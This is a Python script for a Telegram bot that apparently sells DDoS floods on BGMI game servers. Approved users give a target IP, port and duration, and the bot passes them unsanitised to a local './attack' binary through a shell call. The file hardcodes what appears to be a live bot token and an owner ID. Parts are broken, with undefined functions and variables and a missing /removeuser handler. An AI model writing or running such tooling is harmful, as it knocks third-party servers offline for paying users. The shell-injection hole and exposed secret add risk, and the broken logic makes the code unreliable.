#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import logging
import random
import string

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7752268813:AAF-BOZoVoVPLqpjZiDi-yp-uWN1YJLnWOc')

# Owner and admin user IDs
owner_id = "6231324650"
admin_ids = [6231324650]

# File to store allowed user IDs
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Dictionary to store cooldown time for each user's last attack
bgmi_cooldown = {}

# Function to read allowed user IDs from file
def read_users():
    if not os.path.exists(USER_FILE):
        open(USER_FILE, "w").close()  # Agar file nahi hai toh blank file bana dega
    try:
        with open(USER_FILE, "r") as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except Exception as e:
        return []

@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        f"🌟 Welcome to the BGMI DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Commands:\n"
        "💥 /attack <ip> <port> <time> - Start attack\n"
        "👤 /approveuser <id> - Approve user\n"
        "❌ /removeuser <id> - Remove user\n"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_approve = command[1]
            if user_to_approve not in allowed_user_ids:
                allowed_user_ids.append(user_to_approve)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_approve}\n")
                response = f"User {user_to_approve} approved successfully ✅."
            else:
                response = "User is already approved."
        else:
            response = "Usage: /approveuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    
    # Check if user is authorized
    if user_id in allowed_user_ids or user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                duration = int(command[3])
            except ValueError:
                bot.send_message(message.chat.id, "Port and duration must be numbers.")
                return

            if duration > 300:
                bot.send_message(message.chat.id, "Error: Time interval must be less than or equal to 300 seconds.")
                return

            # Send attack start notification
            start_msg = f"🚀 Attack Started Successfully! 🚀\n\n🗿 Target: {target}:{port}\n🕦 Duration: {duration}s"
            bot.send_message(message.chat.id, start_msg)

            # Execute the local attack binary safely
            try:
                full_command = f"./attack {target} {port} {duration}"
                subprocess.Popen(full_command, shell=True)
            except Exception as e:
                logging.error(f"Attack execution failed: {e}")
        else:
            bot.send_message(message.chat.id, "Please provide attack in the format:\n\n/attack <ip> <port> <time>")
    else:
        bot.send_message(message.chat.id, "🚫 Unauthorized Access! Contact Admin or Owner for approval.")

# Start the bot polling with automatic error handling
if __name__ == "__main__":
    while True:
        try:
            print("Bot is starting polling...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Polling error occurred: {e}. Restarting in 5 seconds...")
            import time
            time.sleep(5)
